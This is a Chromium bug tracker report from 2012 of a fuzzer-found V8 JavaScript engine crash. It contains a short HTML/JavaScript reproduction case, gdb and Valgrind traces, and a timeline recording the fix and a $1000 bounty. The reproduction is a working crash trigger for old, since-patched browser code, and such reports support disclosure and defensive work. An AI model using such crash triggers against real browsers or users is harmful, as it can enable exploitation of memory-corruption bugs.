# [LangFuzz] Crash on heap trying to execute address 0x0000000200000000.

| Field | Value |
|-------|-------|
| **Issue ID** | [40062220](https://issues.chromium.org/issues/40062220) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Unknown |
| **Reporter** | de...@googlemail.com |
| **Assignee** | [Deleted User] |
| **Created** | 2012-08-01 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

The JavaScript code (HTML file) below crashes Chromium 22.0.1221.1 dev and d8 shell on heap trying to execute the address 0x0000000200000000.

**VERSION**  

Chrome Version: 22.0.1221.1 dev  

Operating System: Ubuntu 12.04 64 bit

**REPRODUCTION CASE**

<script>
try {
Object.prototype.\_\_defineGetter\_\_("x", function() {});
((function() {
})());
} catch(exc1) {}
</script>
<script>
var i = 500000;
var a = new Array(i);
for (var j = 0; j < i; Array ++) { var o = {}; o.x ^= 42; delete o.x; a[j] = o; }
</script>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:  

Program received signal SIGSEGV, Segmentation fault.  

0x0000000200000000 in ?? ()  

(gdb) bt 4  

#0 0x0000000200000000 in ?? ()  

#1 0x00001b6a982098ce in ?? ()  

#2 0x00000b553ca04121 in ?? ()  

#3 0x00000b553ca04121 in ?? ()  

(More stack frames follow...)  

(gdb) x /i $pc  

=> 0x200000000: Cannot access memory at address 0x200000000

Trace from D8 with Valgrind:

==19882== Jump to the invalid address stated on the next line  

==19882== at 0x200000000: ???  

==19882== by 0x1C988A041E9F: ???  

==19882== by 0x1C988A00CFA6: ???  

==19882== by 0x1C988A006115: ???  

==19882== by 0x46EF79: v8::internal::Invoke(bool, v8::internal::Handle[v8::internal::JSFunction](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, bool\*) (in /scratch/holler/LangFuzz/v8-trunk/d8)  

==19882== by 0x47085D: v8::internal::Execution::Call(v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, bool\*, bool) (in /scratch/holler/LangFuzz/v8-trunk/d8)  

==19882== by 0x40E119: v8::Script::Run() (in /scratch/holler/LangFuzz/v8-trunk/d8)  

==19882== by 0x6D8361: v8::Shell::ExecuteString(v8::Handle[v8::String](javascript:void(0);), v8::Handle[v8::Value](javascript:void(0);), bool, bool) (in /scratch/holler/LangFuzz/v8-trunk/d8)  

==19882== by 0x6D9E74: v8::SourceGroup::Execute() (in /scratch/holler/LangFuzz/v8-trunk/d8)  

==19882== by 0x6DA8AF: v8::Shell::RunMain(int, char\*\*) (in /scratch/holler/LangFuzz/v8-trunk/d8)  

==19882== by 0x6DAC7C: v8::Shell::Main(int, char\*\*) (in /scratch/holler/LangFuzz/v8-trunk/d8)  

==19882== by 0x580BEEC: (below main) (in /lib64/libc-2.12.2.so)  

==19882== Address 0x200000000 is not stack'd, malloc'd or (recently) free'd

## Timeline

### in...@chromium.org (2012-08-01)

[Empty comment from Monorail migration]

### da...@chromium.org (2012-08-02)

Looks like getter/setter inlining?

### [Deleted User] (2012-08-02)

[Empty comment from Monorail migration]

### [Deleted User] (2012-08-03)

Fixed in v8:r12252, the roll of the corresponding v8 3.12.19.1 into Chrome is already in the CQ. The bug first appeared in v8 3.12.14, so there is no need to fix other branches.

### sc...@gmail.com (2012-08-03)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-10-02)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-10-02)

Nice regression catch.
$1000

### sc...@gmail.com (2012-10-12)

Paid as part of $3000 batch.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-11)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-07-29)

[Empty comment from Monorail migration]

### is...@google.com (2018-07-29)

This issue was migrated from crbug.com/chromium/140083?no_tracker_redirect=1

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40062220)*
